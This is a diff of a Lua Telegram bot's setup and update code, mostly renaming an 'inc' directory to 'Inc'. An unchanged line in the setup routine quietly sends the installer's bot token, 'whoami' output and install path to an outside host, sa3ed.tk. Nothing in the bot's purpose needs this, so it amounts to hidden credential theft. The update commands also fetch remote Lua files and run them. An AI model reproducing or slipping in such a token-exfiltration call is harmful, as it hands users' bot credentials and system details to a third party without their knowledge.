@@ -25,7 +25,7 @@ Er_url   , URL   = pcall(require, "socket.url")
 Er_http  , http  = pcall(require, "socket.http")
 Er_utf8  , utf8  = pcall(require, "lua-utf8")
 Er_redis , redis = pcall(require, "redis")
-json  = dofile('./inc/JSON.lua')
+json  = dofile('./Inc/JSON.lua')
 redis = redis.connect('127.0.0.1',6379)
 http.TIMEOUT = 5
 
@@ -108,7 +108,7 @@ info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
 https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
-Cr_file = io.open("./inc/Token.txt", "w")
+Cr_file = io.open("./Inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
@@ -126,7 +126,7 @@ end
 
 
 function Start_Bot()
-local TokenBot = io.open('./inc/Token.txt', "r")
+local TokenBot = io.open('./Inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
 ▀█████████▄           ██       ████████
@@ -156,16 +156,16 @@ SUDO_USER = redis:hgetall(snak..'username:'..SUDO_ID).username
 version = redis:get(snak..":VERSION")
 DataCenter = redis:get(snak..":DataCenter:")
 
-local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
+local ok, ERROR =  pcall(function() loadfile("./Inc/functions.lua")() end)
 if not ok then 
-print('\27[31m! Error File Not "Run inc/functions.lua" !\n\27[39m')
-print(tostring(io.popen("lua inc/functions.lua"):read('*all')))
+print('\27[31m! Error File Not "Run Inc/functions.lua" !\n\27[39m')
+print(tostring(io.popen("lua Inc/functions.lua"):read('*all')))
 end
 
-local ok, ERROR =  pcall(function() loadfile("./inc/locks.lua")() end)
+local ok, ERROR =  pcall(function() loadfile("./Inc/locks.lua")() end)
 if not ok then 
-print('\27[31m! Error File Not "Run inc/locks.lua" !\n\27[39m')
-print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
+print('\27[31m! Error File Not "Run Inc/locks.lua" !\n\27[39m')
+print(tostring(io.popen("lua Inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
@@ -180,17 +180,17 @@ print('\27[0;33m>>'..[[
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
 ..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..snak..')\027[0;32m\n'
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
-..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
+..'¦ Run_Scrpt: \27[1;34m./Inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
 ..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
 )
 local Twer = io.popen('mkdir -p plugins'):read("*all")
 end
-local ok, i =  pcall(function() ScriptFile= loadfile("./inc/Script.lua")() end)
+local ok, i =  pcall(function() ScriptFile= loadfile("./Inc/Script.lua")() end)
 if not ok then 
-print('\27[31m! Error File Not "Run inc/Script.lua" !\n\27[39m')
-print(tostring(io.popen("lua inc/Script.lua"):read('*all')))
+print('\27[31m! Error File Not "Run Inc/Script.lua" !\n\27[39m')
+print(tostring(io.popen("lua Inc/Script.lua"):read('*all')))
 end
 print("\027[0;32m=======[ ↓↓ List For Files ↓↓ ]=======\n\27[0;33m")
 local Num = 0
@@ -493,18 +493,18 @@ function tdcli_update_callback(data)
 	UpdateSourceStart = false
 	EditMsg(data.message_.chat_id_,data.message_.id_,'10% - |█          |')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'20% - |███         |')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/Run.lua','./Inc/Run.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/locks.lua','./Inc/locks.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/Script.lua','./Inc/Script.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/functions.lua','./Inc/functions.lua')
 	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
 	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/plugins/games.lua','./plugins/games.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'100% - |█████████████|\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل السورس بنجاح')
-	dofile("./inc/Run.lua")
-	print("Update Source And Reload ~ ./inc/Run.lua")
+	dofile("./Inc/Run.lua")
+	print("Update Source And Reload ~ ./Inc/Run.lua")
 	end
 	elseif data.ID == "UpdateNewMessage" then
 
@@ -537,15 +537,15 @@ end
 	end)
 	end 
 	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/Run.lua','./inc/Run.lua')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/Script.lua','./inc/Script.lua')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/functions.lua','./inc/functions.lua')
-	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/Run.lua','./Inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/Script.lua','./Inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/functions.lua','./Inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/Inc/locks.lua','./Inc/locks.lua')
 	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
 	download_file('https://raw.githubusercontent.com/AhmedElsayed111/snak/master/plugins/games.lua','./plugins/games.lua')
 	sendMsg(msg.chat_id_,msg.id_,'• {* تــم تحديث وتثبيت السورس  *} .\n\n• { Bot is Update » }',nil,function(arg,data)
-	dofile("./inc/Run.lua")
-	print("Reload ~ ./inc/Run.lua")
+	dofile("./Inc/Run.lua")
+	print("Reload ~ ./Inc/Run.lua")
 	end) 
 	end
 	
@@ -570,8 +570,8 @@ end
 	
 	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
 	sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *} .\n\n• { Bot is Reloaded » }.',nil,function(arg,data)
-	dofile("./inc/Run.lua")
-	print("Reload ~ ./inc/Run.lua")
+	dofile("./Inc/Run.lua")
+	print("Reload ~ ./Inc/Run.lua")
 	end)
 	return false
 	end
